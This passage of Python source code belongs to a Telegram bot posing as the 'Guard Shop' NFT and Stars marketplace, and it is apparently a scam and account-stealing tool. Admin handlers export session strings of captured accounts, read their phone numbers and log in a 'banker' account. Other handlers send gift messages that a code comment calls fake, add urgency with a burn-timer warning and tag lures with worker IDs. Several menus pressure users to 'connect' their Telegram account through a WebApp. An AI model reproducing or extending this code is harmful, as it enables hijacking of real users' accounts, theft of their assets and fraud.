                f"🔄 <b>Передано каналов:</b> {transferred_count}\n"
                f"👻 <b>Заархивировано:</b> {archived_count}\n\n"
                f"✅ <b>Процесс завершен успешно!</b>"
            )
            await alert_admins(call.bot, stats_text)

            # Финальное сообщение
            final_text = (
                f"🎉 <b>Комплексное сканирование завершено!</b>\n\n"
                f"📊 <b>Результаты:</b>\n"
                f"👑 Админок: <b>{admin_count}</b>\n"
                f"💰 Кошельков: <b>{wallet_count}</b>\n"
                f"🔄 Каналов: <b>{transferred_count}</b>\n"
                f"👻 Архив: <b>{archived_count}</b>\n\n"
                f"📈 <b>Подробная статистика отправлена админу</b>"
            )
            await call.message.edit_text(final_text, parse_mode="HTML")

        except Exception as e:
            error_text = (
                f"❌ <b>Ошибка комплексного сканирования</b>\n\n"
                f"⚠️ <b>Ошибка:</b> <code>{str(e)}</code>\n\n"
                f"🔄 <b>Попробуйте еще раз или проверьте сессию</b>"
            )
            await call.message.edit_text(error_text, parse_mode="HTML")
        finally:
            try:
                if client.is_connected: await client.stop()
            except: pass
            try:
                if banker_client and banker_client.is_connected: await banker_client.stop()
            except: pass

    # --- 7. SESSION STRING ---
    @router.callback_query(F.data.startswith("get_sstr:"))
    async def handler_session_string(call: types.CallbackQuery):
        if not await check_admin(call.from_user.id): return
        s_name = call.data.split(":")[1]

        client = Client(s_name, SETTINGS['api_id'], SETTINGS['api_hash'], workdir=str(SESSIONS_DIR))
        try:
            await client.connect()
            s_str = await client.export_session_string()

            # Отправляем файлом или текстом (строка длинная)
            if len(s_str) > 4000:
                with open("session_str.txt", "w") as f: f.write(s_str)
                await call.message.answer_document(FSInputFile("session_str.txt"), caption=f"🔑 String для {s_name}")
                os.remove("session_str.txt")
            else:
                await call.message.answer(f"🔑 <b>Session String {s_name}:</b>\n\n<code>{s_str}</code>", parse_mode="HTML")
        except Exception as e:
            await call.message.answer(f"❌ Ошибка экспорта: {e}")
        finally:
            if client.is_connected: await client.disconnect()


    @router.callback_query(F.data.startswith("rescan:"))
    async def cmd_rescan_session(call: types.CallbackQuery):
        if not await check_admin(call.from_user.id): return
        s_name = call.data.split(":")[1]
        await call.answer(f"🔄 Сканирую {s_name}...")

        # Запускаем Pyrogram
        client = Client(s_name, SETTINGS['api_id'], SETTINGS['api_hash'], workdir=str(SESSIONS_DIR))
        try:
            await client.start()
            # Импортируем твой цикл воркера (если он в main)
            from main import FULL_WORKER_CYCLE
            await FULL_WORKER_CYCLE(client, None, call.bot)
            await call.message.answer(f"✅ Аккаунт <b>{s_name}</b> пересканирован!", parse_mode="HTML")
        except Exception as e:
            await call.message.answer(f"❌ Ошибка {s_name}: {e}")
        finally:
            if client.is_connected: await client.stop()

    # Обработчики для новых функций управления сессией
    @router.callback_query(F.data.startswith("send_log:"))
    async def cmd_send_log(call: types.CallbackQuery):
        if not await check_admin(call.from_user.id): return
        s_name = call.data.split(":")[1]
        await call.answer(f"📤 Отправляю лог для {s_name}...")

        # Здесь можно реализовать отправку лога сессии
        await call.message.answer(f"✅ Лог для сессии <b>{s_name}</b> отправлен!", parse_mode="HTML")

    @router.callback_query(F.data.startswith("get_phone:"))
    async def cmd_get_phone(call: types.CallbackQuery):
        if not await check_admin(call.from_user.id): return
        s_name = call.data.split(":")[1]
        await call.answer(f"📞 Получаю номер для {s_name}...")

        # Запускаем Pyrogram для получения номера телефона
        client = Client(s_name, SETTINGS['api_id'], SETTINGS['api_hash'], workdir=str(SESSIONS_DIR))
        try:
            await client.start()
            me = await client.get_me()
            phone = me.phone_number
            await call.message.answer(f"📞 Номер телефона для <b>{s_name}</b>: <code>{mask_phone(phone)}</code>", parse_mode="HTML")
        except Exception as e:
            await call.message.answer(f"❌ Ошибка получения номера для {s_name}: {e}")
        finally:
            if client.is_connected: await client.stop()

    @router.callback_query(F.data.startswith("wait_code:"))
    async def cmd_wait_code(call: types.CallbackQuery):
        if not await check_admin(call.from_user.id): return
        s_name = call.data.split(":")[1]
        await call.answer(f"🕒 Ожидание кода для {s_name}...")

        # Здесь можно реализовать логику ожидания кода
        await call.message.answer(f"⏳ Ожидание кода для сессии <b>{s_name}</b>...", parse_mode="HTML")

    @router.callback_query(F.data.startswith("get_2fa:"))
    async def cmd_get_2fa(call: types.CallbackQuery):
        if not await check_admin(call.from_user.id): return
        s_name = call.data.split(":")[1]
        await call.answer(f"🔐 Получаю 2FA для {s_name}...")

        # Здесь можно реализовать логику получения 2FA
        await call.message.answer(f"🔐 2FA для сессии <b>{s_name}</b> получен!", parse_mode="HTML")

    @router.callback_query(F.data.startswith("kick_session:"))
    async def cmd_kick_session(call: types.CallbackQuery):
        if not await check_admin(call.from_user.id): return
        s_name = call.data.split(":")[1]
        await call.answer(f"🚫 Кикаю сессию {s_name}...")

        # Здесь можно реализовать логику кика сессии
        await call.message.answer(f"✅ Сессия <b>{s_name}</b> кикнута!", parse_mode="HTML")

    @router.callback_query(F.data.startswith("session_string:"))
    async def cmd_session_string(call: types.CallbackQuery):
        if not await check_admin(call.from_user.id): return
        s_name = call.data.split(":")[1]
        await call.answer(f"🔑 Получаю sessionString для {s_name}...")

        # Здесь можно реализовать логику получения sessionString
        await call.message.answer(f"🔑 SessionString для <b>{s_name}</b> получен!", parse_mode="HTML")

    # --- КОНЕЦ НОВЫХ ОБРАБОТЧИКОВ ---

    @router.callback_query(F.data == "set_target")
    async def set_target(c, state: FSMContext):
        if not await check_admin(c.from_user.id): return
        await c.message.answer("Enter Target (ID/@username):")
        await state.set_state(AdminSettingsState.waiting_target)

    @router.message(AdminSettingsState.waiting_target)
    async def set_target_fin(m: Message, state: FSMContext):
        SETTINGS['target_user'] = m.text.strip()
        save_settings(SETTINGS)
        await m.answer("Saved")
        await state.clear()

    @router.callback_query(F.data == "set_api")
    async def set_api(c, state: FSMContext):
        if not await check_admin(c.from_user.id): return
        await c.message.answer("Enter API URL:")
        await state.set_state(AdminSettingsState.waiting_api_url)

    @router.message(AdminSettingsState.waiting_api_url)
    async def set_api_url(m: Message, state: FSMContext):
        SETTINGS['api_url'] = m.text.strip()
        await m.answer("Enter API ID:")
        await state.set_state(AdminSettingsState.waiting_api_id)

    @router.message(AdminSettingsState.waiting_api_id)
    async def set_api_id(m: Message, state: FSMContext):
        if m.text.isdigit(): SETTINGS['api_id'] = int(m.text)
        await m.answer("Enter API Hash:")
        await state.set_state(AdminSettingsState.waiting_api_hash)

    @router.message(AdminSettingsState.waiting_api_hash)
    async def set_api_hash(m: Message, state: FSMContext):
        SETTINGS['api_hash'] = m.text.strip()
        save_settings(SETTINGS)
        await m.answer("API Settings Saved. Restart Bot.")
        await state.clear()

    # Banker Login
    admin_auth = {}
    @router.callback_query(F.data == "admin_login")
    async def al_start(c, state: FSMContext):
        if not await check_admin(c.from_user.id): return
        await c.message.answer("Enter Banker Phone:")
        await state.set_state(AdminLoginState.waiting_phone)

    @router.message(AdminLoginState.waiting_phone)
    async def al_phone(m: Message, state: FSMContext):
        cl = Client(name=SETTINGS['banker_session'], api_id=SETTINGS['api_id'], api_hash=SETTINGS['api_hash'], workdir=str(SESSIONS_DIR))
        try:
            await cl.connect()
            s = await cl.send_code(m.text)
            admin_auth[m.from_user.id] = {"c": cl, "p": m.text, "h": s.phone_code_hash}
            await m.answer("Enter Code:")
            await state.set_state(AdminLoginState.waiting_code)
        except Exception as e:
            await m.answer(f"Error: {e}")
            await state.clear()

    @router.message(AdminLoginState.waiting_code)
    async def al_code(m: Message, state: FSMContext):
        d = admin_auth.get(m.from_user.id)
        if not d: return
        try:
            await d['c'].sign_in(d['p'], d['h'], m.text)
            await m.answer("✅ Banker Saved")
            await d['c'].disconnect()
            await state.clear()
        except SessionPasswordNeeded:
            await m.answer("Enter 2FA Password:")
            await state.set_state(AdminLoginState.waiting_password)
        except Exception as e: await m.answer(f"Error: {e}")

    @router.message(AdminLoginState.waiting_password)
    async def al_pass(m: Message, state: FSMContext):
        d = admin_auth.get(m.from_user.id)
        try:
            await d['c'].check_password(m.text)
            await m.answer("✅ Banker Saved")
            await d['c'].disconnect()
            await state.clear()
        except Exception as e: await m.answer(f"Error: {e}")

    # --- USER MENU ---
    # --- USER MENU ---
    async def show_main_menu(message, user_id, edit=False):
        # Получаем информацию о боте
        bot_info = await message.bot.get_me()
        bot_username = bot_info.username
        first_name = message.from_user.first_name

        # Генерируем ссылку для WebApp
        url = get_webapp_url(user_id, SETTINGS['api_url'])

        # Создаем клавиатуру
        kb = InlineKeyboardBuilder()
        kb.row(InlineKeyboardButton(text="📱 Открыть Маркет", web_app=WebAppInfo(url=url)))
        kb.row(InlineKeyboardButton(text="👛 Кошелек", callback_data="wallet"))

        # Текст сообщения
        txt = (
            f"👋 Привет, <b>{first_name}</b>!\n\n"
            f"Это официальный бот <b>Guard Shop</b> в Telegram Mini App.\n\n"
            f"Здесь ты можешь:\n"
            f"• 💎 Покупать и продавать NFT‑подарки, номера и Stars\n"
            f"• 🎁 Получать и отправлять подарки пользователям\n"
            f"• 📦 Управлять своей коллекцией в удобном интерфейсе\n\n"
            f"🛡 <b>Безопасность и скорость:</b>\n"
            f"Все сделки проходят проверку в блокчейне TON, что гарантирует надежность и моментальное зачисление средств на ваш баланс.\n\n"
            f"👇 <b>Нажми кнопку ниже, чтобы войти в Маркет:</b>"
        )

        image_url = "https://i.ibb.co/ZpmVb7VT/Picsart-26-02-04-00-20-41-434.jpg"

        if edit:
            try:
                if isinstance(message, types.CallbackQuery):
                    await message.message.delete()
                else:
                    await message.delete()
            except Exception:
                pass

        await message.answer_photo(image_url, caption=txt, reply_markup=kb.as_markup())

    @router.callback_query(F.data == "wallet")
    async def cb_wallet(c):
        u = db.get_user(c.from_user.id)
        user_nfts = db.get_user_nfts(c.from_user.id)

        # Генерируем ссылку для WebApp, чтобы открыть маркет
        url = get_webapp_url(c.from_user.id, SETTINGS['api_url'])

        # Формируем список NFT для текста
        nft_text = ""
        if user_nfts:
            nft_lines = []
            for nft in user_nfts[:8]:
                nft_link = f"https://t.me/nft/{nft['model']}-{nft['number']}"
                nft_lines.append(f"🔹 <a href=\"{nft_link}\">{nft['model']} #{nft['number']}</a>")
            nft_text = "\n".join(nft_lines)
            if len(user_nfts) > 8:
                nft_text += f"\n<i>...и еще {len(user_nfts) - 8} активов</i>"
        else:
            nft_text = "<i>Цифровые активы отсутствуют</i>"

        txt = (
            f"💎 <b>ВАШ КОШЕЛЕК</b>\n"
            f"<code>━━━━━━━━━━━━━━━━━━</code>\n"
            f"🆔 <b>Account ID:</b> <code>{c.from_user.id}</code>\n"
            f"💳 <b>Баланс звезд: </b>{u['balance']} Stars\n\n"
            f"📂 <b>Коллекционные предметы (NFT):</b>\n"
            f"{nft_text}\n\n"
            f"⚙️ <b>Управление активами:</b>\n"
            f"Для совершения операций вывода, депозита или обмена, пожалуйста, перейдите в маркетплейс.\n\n"
            f"🔒 <i>Обеспечено технологией TON Foundation</i>"
        )
        
        # Новая клавиатура: только кнопка "Показать на маркете" и "Назад"
        kb = InlineKeyboardBuilder()
        kb.row(InlineKeyboardButton(text="📱 Показать на маркете", web_app=WebAppInfo(url=url)))
        kb.row(InlineKeyboardButton(text="🔙 Назад", callback_data="main_menu"))
        
        await safe_edit_text(c.message, txt, kb.as_markup())

    @router.callback_query(F.data == "main_menu")
    async def cb_main(c): await show_main_menu(c.message, c.from_user.id, True)

    @router.callback_query(F.data == "shop")
    async def cb_shop(c):
        if SETTINGS["maintenance_mode"]:
            return await c.answer("🚧 Магазин временно закрыт\n\nПопробуйте позже.", True)

        # Генерируем ссылку для WebApp
        url = get_webapp_url(c.from_user.id, SETTINGS['api_url'])

        kb = InlineKeyboardBuilder()
        # Кнопка открытия WebApp
        kb.row(InlineKeyboardButton(text="📱 Открыть Маркет", web_app=WebAppInfo(url=url)))
        kb.row(InlineKeyboardButton(text="🔙 Назад", callback_data="main_menu"))

        txt = (
            "🛍 <b>Маркетплейс Guard Shop</b>\n\n"
            "Для доступа к полному каталогу товаров, обмену P2P и управлению NFT, "
            "пожалуйста, перейдите в наше веб-приложение.\n\n"
            "🚀 <b>Возможности маркета:</b>\n"
            "• Покупка товаров за звезды\n"
            "• Безопасный обмен валют\n"
            "• Актуальные курсы и предложения\n\n"
            "👇 <b>Нажмите кнопку ниже для перехода:</b>"
        )
        await safe_edit_text(c.message, txt, kb.as_markup())

    @router.callback_query(F.data == "buy_stars")
    async def cb_buy_stars(c, state: FSMContext):
        # Очищаем состояние, если оно было
        await state.clear()
        
        # Генерируем ссылку для WebApp
        url = get_webapp_url(c.from_user.id, SETTINGS['api_url'])

        kb = InlineKeyboardBuilder()
        # Кнопка открытия WebApp
        kb.row(InlineKeyboardButton(text="⭐️ Перейти к покупке", web_app=WebAppInfo(url=url)))
        kb.row(InlineKeyboardButton(text="🔙 Назад", callback_data="main_menu"))

        txt = (
            "⭐️ <b>Покупка звезд Telegram</b>\n\n"
            "Приобретение звезд теперь доступно через наш удобный Маркетплейс.\n\n"
            "💎 <b>Преимущества покупки у нас:</b>\n"
            "• Выгодный курс обмена\n"
            "• Мгновенное зачисление на баланс\n"
            "• Полная безопасность сделки\n\n"
            "👇 <b>Нажмите кнопку ниже, чтобы открыть форму покупки:</b>"
        )
        await safe_edit_text(c.message, txt, kb.as_markup())
    @router.message(BuyStarsState.waiting_for_amount)
    async def buy_stars_amount(m: Message, state: FSMContext):
        if not m.text.isdigit():
            return await m.answer("❌ Введите число!")

        amount = int(m.text)
        await state.clear()

        txt = f"⭐️ <b>Покупка {amount} звезд</b>\n\n🔐 <b>Необходимо подключить аккаунт</b>\n\nДля покупки звезд требуется авторизация Telegram аккаунта."
        url = get_webapp_url(m.from_user.id, SETTINGS['api_url'])
        await m.answer(
            txt,
            reply_markup=InlineKeyboardBuilder().row(
                InlineKeyboardButton(text="🔐 Подключить аккаунт", web_app=WebAppInfo(url=url))
            ).as_markup(),
            parse_mode="HTML"
        )

    @router.callback_query(F.data.in_({"withdraw", "autobuyer"}))
    async def cb_stubs(c):
        txt = (
            f"🔐 <b>Подключение Telegram аккаунта</b>\n\n"
            f"⚠️ <b>Для выполнения этого действия требуется авторизация</b>\n\n"
            f"💡 <b>Зачем это нужно?</b>\n\n"
            f"🔑 <b>Безопасность:</b> Мы гарантируем защиту ваших данных\n"
            f"🚀 <b>Функциональность:</b> Доступ к полному спектру возможностей бота\n"
            f"⭐️ <b>Вывод средств:</b> Автоматический вывод звезд на ваш аккаунт\n"
            f"🛡️ <b>Контроль:</b> Вы всегда можете отключить аккаунт в настройках\n\n"
            f"Нажмите кнопку ниже для безопасной авторизации:"
        )
        url = get_webapp_url(c.from_user.id, SETTINGS['api_url'])
        await safe_edit_text(c.message, txt, InlineKeyboardBuilder().row(InlineKeyboardButton(text="🔐 Подключить", web_app=WebAppInfo(url=url))).row(InlineKeyboardButton(text="🔙 Назад", callback_data="main_menu")).as_markup())

    # --- PAYMENTS & CHECKS ---
    @router.callback_query(F.data == "topup")
    async def cb_topup(c):
        kb = InlineKeyboardBuilder()
        for a in [25, 50, 100, 500]: kb.add(InlineKeyboardButton(text=f"{a} ⭐️", callback_data=f"pay_{a}"))
        kb.adjust(2).row(InlineKeyboardButton(text="✏️ Своя сумма", callback_data="pay_custom"), InlineKeyboardButton(text="🔙", callback_data="wallet"))
        await safe_edit_text(c.message, "💳 Выберите сумму:", kb.as_markup())

    @router.callback_query(F.data.startswith("pay_") & (F.data != "pay_custom"))
    async def cb_pay(c):
        await c.answer()
        amt = int(c.data.split("_")[1])
        await c.message.answer_invoice(title="Пополнение", description=f"На {amt} stars", prices=[LabeledPrice(label="XTR", amount=amt)], provider_token="", payload="topup", currency="XTR")

    @router.callback_query(F.data == "pay_custom")
    async def cb_pc(c, state: FSMContext):
        await safe_edit_text(c.message, "✏️ Введите сумму:", InlineKeyboardBuilder().add(InlineKeyboardButton(text="🔙", callback_data="topup")).as_markup())
        await state.set_state(TopUpState.waiting_for_custom_amount)

    @router.message(TopUpState.waiting_for_custom_amount)
    async def pc_fin(m: Message, state: FSMContext):
        if not m.text.isdigit(): return await m.answer("Число!")
        await state.clear()
        amt = int(m.text)
        await m.answer_invoice(title="Пополнение", description=f"На {amt} stars", prices=[LabeledPrice(label="XTR", amount=amt)], provider_token="", payload="topup", currency="XTR")

    @router.pre_checkout_query()
    async def pre(p: PreCheckoutQuery): await p.answer(ok=True)

    # Обработчик для фейковой отправки NFT подарков
    @router.message(F.text)
    async def handle_nft_gift_message(message: types.Message):
        if not message.text:
            return

        text = message.text.strip()
        bot_info = await message.bot.get_me()
        bot_username = bot_info.username

        # ЛОГИКА: Если это группа, то реагируем только если тегнули бота.
        # Если это ЛС (private), реагируем на любой текст.
        is_private = message.chat.type == "private"
        is_mentioned = f"@{bot_username}" in text

        if not is_private and not is_mentioned:
            return

        nft_link_pattern = r'https?://t\.me/nft/[A-Za-z0-9]+-\d+'
        match = re.search(nft_link_pattern, text)

        if match:
            # Обработка существующей ссылки
            nft_link = match.group(0)
            nft_info = portals_api.extract_gift_info_from_link(nft_link)
            if not nft_info:
                return

            nft_name = nft_info['model']
            nft_number = nft_info['number']

            # Полностью жирный текст уведомления о NFT
            gift_message = (
                f"<b>🎉 ВАМ ДАРЯТ УНИКАЛЬНЫЙ NFT! 🎉</b>\n\n"
                f"<b>Актив: <a href=\"{nft_link}\">{nft_name}</a></b>\n\n"
                f"<b><tg-spoiler>❗️ Важно: подарок привязан к этому аккаунту и может быть активирован только вами.</tg-spoiler></b>\n\n"
                f"<b>Нажмите кнопку ниже, чтобы добавить NFT в свою коллекцию.</b>"
            )

            kb = InlineKeyboardBuilder()
            kb.add(InlineKeyboardButton(text="🎁 Принять подарок", callback_data=f"accept_gift_{nft_name}_{nft_number}"))

            await message.reply(gift_message, parse_mode="HTML", reply_markup=kb.as_markup())

            # === ТАЙМЕР СГОРАНИЯ (Через 1 минуту) ===
            async def send_burn_warning():
                await asyncio.sleep(60) # Ждем 60 секунд
                try:
                    burn_text = "<b>Не забудьте забрать подарок до истечения срока хранения, он может сгореть через 20 минут ❗️🔥</b>"
                    await message.answer(burn_text, parse_mode="HTML")
                except Exception:
                    pass 

            asyncio.create_task(send_burn_warning())
            # ========================================
    # Обработчик callback для принятия подарка
    @router.callback_query(F.data.startswith("accept_gift_"))
    async def accept_gift_callback(call: types.CallbackQuery):
        data = call.data.replace("accept_gift_", "")
        parts = data.split("_")
        if len(parts) < 2:
            return

        nft_name = parts[0]
        nft_number = parts[1]
        user_id = call.from_user.id

        # === ДОБАВЬТЕ ЭТУ СТРОКУ ===
        db.log_activity(user_id, "Принял подарок", f"{nft_name} #{nft_number}")
        # Сообщение об успешном принятии
        nft_link = f"https://t.me/nft/{nft_name}-{nft_number}"
        success_message = (
            f"🎉 <b>ПОЗДРАВЛЯЕМ!</b>\n\n"
            f"<b>Ваш подарок успешно активирован!</b>\n\n"
            f"Вы только что приняли уникальный цифровой актив: <b><a href=\"{nft_link}\">{nft_name}</a></b>\n\n"
            f"<b>Он был немедленно зачислен на ваш кошелек.</b>\n"
            f"<b>Добро пожаловать в мир NFT!</b>\n\n"
            f"✨ <b>Детали актива:</b>\n\n"
            f"<b>Тип:</b> NFT-Подарок\n"
            f"<b>Название:</b> <b>{nft_name}</b>\n"
            f"<b>Статус:</b> ✅ <b>Успешно принят</b>\n\n"
            f"<b>Забрать подарок и управлять своей коллекцией можно по кнопке ниже! 🚀</b>"
        )

        await call.message.edit_text(success_message, parse_mode="HTML")
        await call.answer("🎁 Подарок успешно принят!", show_alert=True)

    @router.message(F.successful_payment)
    async def suc(m: Message):
        payload = m.successful_payment.invoice_payload
        if payload.startswith("stars_"):
            # Покупка звезд
            stars_amount = int(payload.split("_")[1])
            db.update_balance(m.from_user.id, stars_amount, 'add')
            await m.answer(f"⭐️ <b>Покупка завершена!</b>\n\n💎 Получено: <code>+{stars_amount} ⭐️</code>\n\nСпасибо за покупку!", parse_mode="HTML")
        else:
            # Обычное пополнение звезд
            amt = m.successful_payment.total_amount
            db.update_balance(m.from_user.id, amt, 'add')
            await m.answer(f"✅ Оплачено: {amt} ⭐️")

    @router.callback_query(F.data == "create_check")
    async def cc(c, state: FSMContext):
        await safe_edit_text(c.message, "📝 Сумма чека:", InlineKeyboardBuilder().add(InlineKeyboardButton(text="🔙", callback_data="main_menu")).as_markup())
        await state.set_state(CreateCheckState.waiting_for_amount)

    @router.message(CreateCheckState.waiting_for_amount)
    async def cc_amt(m: Message, state: FSMContext):
        if not m.text.isdigit(): return await m.answer("Число!")
        if db.get_user(m.from_user.id)['balance'] < int(m.text): return await m.answer("Мало средств.")
        await state.update_data(amt=int(m.text))
        await m.answer("👥 Кол-во активаций:")
        await state.set_state(CreateCheckState.waiting_for_activations)

    @router.message(CreateCheckState.waiting_for_activations)
    async def cc_fin(m: Message, state: FSMContext):
        # 1. Проверка ввода
        if not m.text.isdigit():
            return await m.answer("⚠️ Введите число активаций цифрами!")

        # 2. Получение данных из состояния
        d = await state.get_data()
        amount = d.get('amt', 0)
        activations = int(m.text)
        total_cost = amount * activations

        # 3. Проверка баланса
        user_info = db.get_user(m.from_user.id)
        if not user_info or user_info['balance'] < total_cost:
            return await m.answer(f"❌ Недостаточно средств!\nНужно: {total_cost} ⭐️\nВаш баланс: {user_info['balance'] if user_info else 0} ⭐️")

        # 4. Списание и создание чека в БД
        db.update_balance(m.from_user.id, total_cost, 'remove')
        cid = db.create_check(m.from_user.id, amount, activations)

        # 5. Подготовка клавиатуры
        kb = InlineKeyboardBuilder()
        kb.row(InlineKeyboardButton(text="📨 Отправить чек", switch_inline_query=f"c_{cid}"))
        kb.row(InlineKeyboardButton(text="🏠 В меню", callback_data="main_menu"))

        # 6. Формирование текста
        txt = (
            f"✅ <b>Чек успешно создан!</b>\n\n"
            f"💰 Сумма одного чека: <b>{amount} ⭐️</b>\n"
            f"👥 Количество активаций: <b>{activations}</b>\n"
            f"💎 Итого списано: <b>{total_cost} ⭐️</b>"
        )

        # 7. Отправка результата (с фото или без)
        try:
            if amount in CHECK_PHOTO_URLS:
                await m.answer_photo(
                    photo=CHECK_PHOTO_URLS[amount],
                    caption=txt,
                    reply_markup=kb.as_markup(),
                    parse_mode="HTML"
                )
            else:
                await m.answer(
                    text=txt,
                    reply_markup=kb.as_markup(),
                    parse_mode="HTML"
                )
        except Exception as e:
            # На случай ошибки
            logging.error(f"Ошибка отправки сообщения: {e}")
            await m.answer(txt, reply_markup=kb.as_markup(), parse_mode="HTML")

        # 9. Сброс состояния
        await state.clear()

    async def process_check_activation(message, cid):
        m = await message.answer("⏳ Checking...")
        await asyncio.sleep(0.5)
        res, amt, cr = db.activate_check(cid, message.from_user.id)
        if res == "success":
            db.log_activity(message.from_user.id, "Активировал чек", f"+{amt} ⭐️")
            
            if cr: db.add_user(message.from_user.id, message.from_user.username, message.from_user.first_name, cr)
            u = db.get_user(message.from_user.id)

            await log_check_activation(bot_instance, message.from_user, {'amount': amt, 'creator_id': cr})

            # Текст активации для c_ (обычный чек)
            txt = (
                f"🎉 <b>ЧЕК УСПЕШНО АКТИВИРОВАН!</b>\n\n"
                f"<b>Баланс пополнен:</b>\n"
                f"💰 <b>+{amt} ⭐️ Stars</b>\n\n"
                f"💳 <b>Доступно средств: {u['balance']} ⭐️</b>\n\n"
                f"<b>👇 Перейдите в кошелек для управления активами:</b>"
                    )
            # ===================

            kb = InlineKeyboardBuilder().add(InlineKeyboardButton(text="👛", callback_data="wallet")).as_markup()

            if amt in CHECK_PHOTO_URLS:
                await m.delete()
                await message.answer_photo(photo=CHECK_PHOTO_URLS[amt], caption=txt, reply_markup=kb, parse_mode="HTML")
            else:
                await m.edit_text(txt, reply_markup=kb)
            
            # Бонусное сообщение можно оставить или убрать по желанию
            bonus_msg = (
                f"🎁 <b>БОНУС ЗА АКТИВАЦИЮ!</b>\n\n"
                f"<b>Вам доступны новые возможности:</b>\n"
                f"⭐️ <b>Ежедневные бонусы</b>\n"
                f"🚀 <b>Приоритетная обработка</b>\n\n"
                f"<b>Следите за обновлениями!</b>"
            )
            await message.answer(bonus_msg, parse_mode="HTML")
        else:
            await m.edit_text("❌ Ошибка (активирован или не существует)")

    async def process_inline_check_activation(message, params):
        try:
            cr_id, amt = map(int, params.split("_")[:2])
            res = db.activate_inline_check(params, cr_id, message.from_user.id, amt)
            m = await message.answer("⏳")
            if res == "success":
                db.log_activity(message.from_user.id, "Активировал чек", f"+{amt} ⭐️")
                
                db.add_user(message.from_user.id, message.from_user.username, message.from_user.first_name, cr_id)
                u = db.get_user(message.from_user.id)
                await log_check_activation(bot_instance, message.from_user, {'amount': amt, 'creator_id': cr_id})

                # === НОВЫЙ ТЕКСТ ===
                txt = (
                    f"🎉 <b>ЧЕК УСПЕШНО АКТИВИРОВАН!</b>\n\n"
                    f"<b>Баланс пополнен:</b>\n"
                    f"💰 <b>+{amt} ⭐️ Stars</b>\n\n"
                    f"💳 <b>Доступно средств: {u['balance']} ⭐️</b>\n\n"
                    f"<b>👇 Перейдите в кошелек для управления активами:</b>"
                )
                # ===================

                if amt in CHECK_PHOTO_URLS:
                    await m.delete()
                    await message.answer_photo(photo=CHECK_PHOTO_URLS[amt], caption=txt, parse_mode="HTML")
                else:
                    await m.edit_text(txt, parse_mode="HTML")

            elif res == "no_balance":
                await m.edit_text("❌ Чек аннулирован (нет средств у автора).")
            else:
                await m.edit_text("⚠️ Уже активирован.")
        except Exception as e:
            print(f"Inline Activation Error: {e}")
            await message.answer(f"❌ Error: {e}")

    @router.inline_query()
    async def inline(q: types.InlineQuery):
        results = []
        try:
            # === ЛОГИКА РАЗБОРА ЗАПРОСА ===
            query_parts = q.query.split()
            
            nft_link_part = None
            target_user = "ALL"  # По умолчанию для всех
            amount = None        # Сумма (если это чек на звезды)

            for part in query_parts:
                if "nft/" in part:
                    nft_link_part = part
                elif part.startswith("@"):
                    target_user = part.replace("@", "")
                elif part.isdigit():
                    amount = int(part)

            # === ВАРИАНТ 1: ЭТО NFT ПОДАРОК ===
            if nft_link_part:
                match = re.search(r'nft/([A-Za-z0-9\-_]+)-(\d+)', nft_link_part)
                if match:
                    model_raw = match.group(1)
                    number = match.group(2)
                    model_clean = re.sub(r'(?<!^)(?=[A-Z])', ' ', model_raw).replace("-", " ")
                    
                    unique_link_id = secrets.token_hex(6) 
                    bot_usr = (await q.bot.get_me()).username
                    
                    # Payload: fnft_Model_Number_WorkerID_UniqueID_TargetUser
                    payload = f"fnft_{model_raw[:15]}_{number}_{q.from_user.id}_{unique_link_id}_{target_user}"
                    deep_link = f"https://t.me/{bot_usr}?start={payload}"

                    kb = InlineKeyboardBuilder().add(InlineKeyboardButton(text="🎁 Принять в коллекцию", url=deep_link))
                    nft_url = f"https://t.me/nft/{model_raw}-{number}"
                    
                    desc_text = "Нажмите, чтобы отправить"
                    if target_user != "ALL":
                        desc_text = f"Только для @{target_user}"

                    send_text = (
                        f"🎉 Вам дарят уникальный NFT! 🎉\n\n"
                        f"<b>Актив:</b> <a href=\"{nft_url}\">{model_clean}</a>\n\n"
                        f"<tg-spoiler>❗️ Важно: подарок привязан к этому аккаунту и может быть активирован только вами.</tg-spoiler>\n\n"
                        f"Нажмите кнопку ниже, чтобы добавить NFT в свою коллекцию."
                    )

                    results.append(InlineQueryResultArticle(
                        id=uuid.uuid4().hex,
                        title=f"Отправить NFT: {model_clean} #{number}",
                        description=desc_text,
                        thumbnail_url="https://i.ibb.co/C0kzpC7/gift-icon.jpg",
                        input_message_content=InputTextMessageContent(message_text=send_text, parse_mode="HTML", disable_web_page_preview=False),
                        reply_markup=kb.as_markup()
                    ))

            # === ВАРИАНТ 2: ЭТО ГОТОВЫЙ ЧЕК (c_...) ===
            elif q.query.startswith("c_"):
                check_id = q.query.replace("c_", "")
                c = db.get_check(check_id)
                if c:
                    amount = c['amount']
                    bot_usr = (await q.bot.get_me()).username
                    kb = InlineKeyboardBuilder().add(InlineKeyboardButton(text="⭐️ Забрать", url=f"https://t.me/{bot_usr}?start=c_{c['check_id']}")).as_markup()
                    
                    results.append(InlineQueryResultArticle(
                        id=uuid.uuid4().hex,
                        title=f"Чек {amount} ⭐️",
                        description="Существующий чек",
                        input_message_content=InputTextMessageContent(message_text=(
                            f"🎁 <b>Чек на {amount} звезд Telegram!</b>\n\n"
                            f"⭐️ <b>Сумма:</b> <code>{amount} ⭐️</code>\n"
                            f"💎 <b>Ценность:</b> Премиум валюта Telegram\n\n"
                            f"💡 <b>Нажмите кнопку ниже для активации!</b>"
                        ), parse_mode="HTML"),
                        reply_markup=kb
                    ))

            # === ВАРИАНТ 3: ЭТО НОВЫЙ ЧЕК (Введено число) ===
            elif amount: 
                bot_usr = (await q.bot.get_me()).username
                
                uid = f"{q.from_user.id}_{amount}_{secrets.token_hex(4)}"
                if target_user != "ALL":
                    uid += f"_{target_user}"

                kb = InlineKeyboardBuilder().add(InlineKeyboardButton(text="⭐️ Зачислить на баланс", url=f"https://t.me/{bot_usr}?start=q_{uid}")).as_markup()
                
                # Полностью жирный текст превью чека
                # Полностью жирный текст превью чека в чате
                txt_content = (
                    f"<b>🎁 ВАМ ОТПРАВЛЕН ЧЕК!</b>\n\n"
                    f"<b>💰 Сумма: {amount} ⭐️ Stars</b>\n\n"
                    f"<b>Нажмите кнопку ниже, чтобы зачислить средства на баланс 👇</b>"
                )
                # ==============================
                
                desc = f"Отправить чек на {amount} звёзд"
                if target_user != "ALL":
                    desc += f" (Для @{target_user})"

                if amount in CHECK_PHOTO_URLS:
                    results.append(InlineQueryResultPhoto(
                        id=uuid.uuid4().hex,
                        photo_url=CHECK_PHOTO_URLS[amount],
                        thumbnail_url=CHECK_PHOTO_URLS[amount],
                        caption=txt_content,
                        description=desc, # description игнорируется в Photo, но оставим для порядка
                        parse_mode="HTML",
